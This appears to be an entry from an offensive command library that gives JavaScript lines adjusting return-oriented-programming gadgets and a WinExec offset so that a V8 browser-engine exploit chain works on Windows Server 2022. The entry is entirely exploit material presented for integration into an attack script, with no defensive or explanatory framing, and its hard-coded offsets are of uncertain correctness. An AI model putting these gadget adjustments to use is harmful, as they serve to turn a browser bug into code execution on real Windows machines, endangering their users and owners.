---
data: >-
  add_gadget(0x30bb9c0) // mov rax,qword ptr [rcx];
  ret;\nadd_gadget(0x4536e4d+2) // pop rbx; ret;\nset_reg(idx++,
  0x68820-423328)\nset_reg(idx++,0 )
tags:
  - rop
  - adjustment
type: command
output: Updated ROP chain for specific OS build.
executor: js
platforms:
  - Windows
id: 15690765-3539-41ec-9e88-c3b5ba9f55e2
created_at: '2025-12-13T23:55:06.739Z'
updated_at: '2025-12-13T23:55:06.739Z'
verified: false
validated: true
submitted: true
---
# adjust-rop-gadget-server2022

## Command

```js
add_gadget(0x30bb9c0) // mov rax,qword ptr [rcx]; ret;
add_gadget(0x4536e4d+2) // pop rbx; ret;
set_reg(idx++, 0x68820-423328)
set_reg(idx++,0 )
```

## Description

Adjusts ROP gadgets for Windows Server 2022 offsets in V8 exploit.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| 0x68820-423328 | Adjusted WinExec offset | Yes |

## Examples

### Basic Usage

Integrate into exploit script.

## Expected Output

Chain compatible with Server 2022.

## Related

- [[commands/rop-stage2-resolve-winexec]]
